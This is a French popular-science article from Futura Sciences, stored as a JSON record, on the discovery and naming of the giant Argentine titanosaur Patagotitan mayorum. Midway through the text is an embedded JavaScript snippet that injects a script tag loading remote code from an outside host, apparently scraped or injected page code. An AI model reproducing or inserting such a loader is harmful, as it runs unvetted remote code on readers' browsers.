{"title": "Voici Patagotitan mayorum, le plus grand de tous les dinosaures", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "11/08/2017", "content": "Il y a environ cent millions d'années, dans l'actuelle Patagonie, des jeunes titanosaures vivaient dans une plaine d'inondation qui deviendra plus tard un désert en Patagonie. Leurs restes fossilisés viennent de révéler une nouvelle espèce qui pourrait fort bien être la plus grande parmi tous les dinosaures. Son nom :  Patagotitan mayorum . Ce qu'il faut retenir Les titanosaures forment un groupe de sauropodes herbivores célèbres pour leurs grandes tailles. Les plus grands datent du Crétacé et ont été découverts en Argentine. Une nouvelle espèce, dont le squelette avait déjà été reconstitué pour une exposition, a été l'objet d'une étude longue de quatre années. Patagotitan mayorum , c'est son nom, dépasse pour le moment par sa taille et son poids tous les autres dinosaures géants connus à ce jour. En  matière  de  dinosaures , l'Argentine et la Patagonie occupent régulièrement le devant de la scène depuis plus d'une décennie. C'est avec raison car on y a trouvé des spécimens parmi les plus anciens, comme  Herrerasaurus , et parmi les plus grands, comme  Argentinosaurus . Ce dernier fait partie des  Titanosauria  (les titanosaures en français), un groupe de dinosaures sauropodes  herbivores  dominants à la fin du  Crétacé  et dont on trouve des représentants un peu partout sur la planète, y compris en France. En 2012, un employé du ranch de La Flecha en Patagonie, propriété de la famille Mayo, avait signalé la présence d'ossements fossilisés. Lorsque l'importance du site a été réalisée, les paléontologues ont commencé à affluer pour venir fouiller. Ce ne sont pas moins de six animaux qui ont été identifiés dans les plus de 150  fossiles  déterrés par une quinzaine de chercheurs, géologues et étudiants, gratuitement hébergés par les Mayo. Il s'agissait clairement des restes d'individus sans doute jeunes d'une nouvelle  espèce  de dinosaure de très grande taille mais dont il restait à préciser la nature.  Une présentation de la découverte du nouveau titanosaure argentin. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». ©  American Museum of Natural History Le plus grand titanosaure ? Pas certain Dès 2013, cependant, il était devenu évident qu'il s'agissait d'un  titanosaure  et peut-être du plus grand dinosaure découvert à ce jour, de sorte que cette découverte avait été rapidement médiatisée et qu'un documentaire de la  BBC  lui avait été consacré. Il était toutefois encore trop tôt pour lui donner un nom et affirmer avec certitude qu'un nouveau record de taille avait été établi.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les paléontologues ont patiemment travaillé durant quatre années, comparant les données collectées à partir de l'étude des ossements à celles des autres grands  sauropodes  connus du Crétacé et ils viennent aujourd'hui de publier leurs conclusions dans un article des  Proceedings of the Royal Society of London . Photo prise au moment des fouilles, en 2013, montrant le fémur de 2,40 m de long. Le paléontoloque Diego Pol, du Musée de paléontologie Egidio Feruglio, pose devant lui. ©  Museo paleontologico Egidio Feruglio  (MEF)                               Patagotitan mayorum , un titanosaure de 70 tonnes Patagotitan mayorum  vient ainsi d'entrer de plain pied dans le monde des Titanosaures. Il s'agit bien d'un «  Titan  de Patagonie » ( Patagotitan ) et il « appartient » à la famille Mayo, d'où le terme  mayorum , en son honneur et pour la remercier de son aide pour les fouilles, précisent les chercheurs. Les lois de la biomécanique permettent d'estimer le poids d'un  vertébré  en fonction des caractéristiques de ses os, qui doivent supporter son poids. Ceux du plus grand de ces fossiles ont été scannés au  laser , ce qui a permis de reconstituer sur  ordinateur  le squelette de  Patagotitan mayorum  puis d'y ajouter des chairs. Les paléontologues en concluent qu'il pouvait peser environ 70 tonnes, soit le poids d'environ 10 éléphants africains. Il pouvait mesurer environ 37 mètres de long et 8 mètres au garrot. Un moulage de son squelette a déjà fait l'objet d'une exposition à l' American Museum of Natural History  en 2016. Interview : trois dinosaures exceptionnels                       Les dinosaures sont des créatures étonnantes de par leur nature, leurs capacités ou encore leur taille. Ils ne connaissent pas d’équivalent dans le monde animal actuel. Futura-Sciences a interviewé Éric Buffetaut, paléontologue, afin qu’il nous parle des dinosaures les plus surprenants.                                       ", "theme": "planete"}